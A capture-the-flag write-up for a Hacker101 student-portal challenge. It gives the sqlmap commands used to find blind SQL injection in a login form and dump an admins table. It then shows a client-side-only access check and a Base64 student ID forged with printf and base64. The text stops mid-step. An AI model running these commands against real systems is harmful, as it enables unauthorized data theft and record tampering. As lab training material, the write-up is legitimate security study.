# Hacker101 CTF Write-up: SQL Injection to Broken Access Control

**Platform:** Hacker101 CTF
**Challenge:** OSUSEC Student Portal (two stages)
**Target:** `https://<challenge-id>.ctf.hacker101.com` (redacted)
**Vulnerabilities:** Blind SQL injection (MySQL), Insecure Direct Object Reference (IDOR) with client-side-only authorization

## Overview

The challenge had two stages. In the first, the login form was vulnerable to blind SQL injection, which exposed the database schema and an admin record. In the second, the student portal enforced its access rules only in client-side JavaScript. A non-admin staff session could reach another student's update page by forging the record identifier.

The goal was to change Natasha Drew's grades to A in all three subjects so she could attend Hacker Camp.

## Environment and Tools

- Kali/Ubuntu Linux terminal
- sqlmap 1.10.6#stable
- curl
- A browser with developer tools

## Stage 1: Blind SQL Injection on the Login Form

### Step 1: Identify the injectable parameter

The login form sent `username` and `password` to `/login`. I used sqlmap to test the `username` parameter, using a known test account to get a baseline response.

```bash
TARGET="https://<challenge-id>.ctf.hacker101.com"

sqlmap -u "$TARGET/login" \
  --data="username=testuser&password=testpass" \
  -p username \
  --dbs \
  --batch
```

sqlmap confirmed two injection techniques:

- **Boolean-based blind:** a subquery using `CASE WHEN` inside an `AND` condition
- **Time-based blind:** a `SLEEP(5)` subquery inside an `AND` condition

The back end was MySQL (MariaDB fork), served through OpenResty. sqlmap listed four databases: `information_schema`, `mysql`, `performance_schema`, and `level2`. The `level2` database was the target.

### Step 2: Enumerate tables

```bash
sqlmap -u "$TARGET/login" \
  --data="username=testuser&password=testpass" \
  -p username \
  -D level2 \
  --tables \
  --batch
```

`level2` contained two tables: `admins` and `pages`.

### Step 3: Enumerate columns

```bash
sqlmap -u "$TARGET/login" \
  --data="username=testuser&password=testpass" \
  -p username \
  -D level2 \
  -T admins \
  --columns \
  --batch
```

The `admins` table had three columns: `id` (int(11)), `username` (varchar(256)), and `password` (varchar(256)).

### Step 4: Dump the admin record

```bash
sqlmap -u "$TARGET/login" \
  --data="username=testuser&password=testpass" \
  -p username \
  -D level2 \
  -T admins \
  --dump \
  --batch
```

The table contained one row. I have redacted the credentials here. sqlmap saved the dump as a CSV file in its output directory.

> **Note:** sqlmap generated many HTTP 500 responses during enumeration. This is expected with blind injection, because malformed queries produce server errors.

**Stage 1 flag:** `[REDACTED]`

## Stage 2: Broken Access Control in the Student Portal (IDOR)

### Step 1: Review the dashboard source

After logging in, I inspected the dashboard HTML and JavaScript. The page defined a client-side `staff` object:

```javascript
var staff = {
    admin: false,
    name: 'rhonda.daniels'
}
```

So the session belonged to `rhonda.daniels`, and the client-side admin flag was `false`.

The student rows carried Base64-encoded identifiers in HTML attributes:

```html
<td data-id="TmFuY2llX0JyZXR0" class="student-link">
    Nancie, Brett
</td>
```

### Step 2: Understand the client-side restriction

The JavaScript made student rows clickable only when `staff.admin` was true:

```javascript
if (s.admin) {
    var sl = document.getElementsByClassName("student-link");

    for (i = 0; i < sl.length; i++) {
        sl[i].addEventListener("click", function() {
            window.location = '/update-' + objectName + '/' + this.dataset.id;
        });
    }
}
```

This check runs only in the browser. It says nothing about whether the server enforces authorization on the update route.

### Step 3: Forge the identifier

Natasha Drew did not appear in the dashboard's student list. Since the identifiers were Base64-encoded names, I encoded hers:

```bash
printf 'Natasha_Drew' | base64
# TmF0YXNoYV9EcmV3
```

This gave the update route: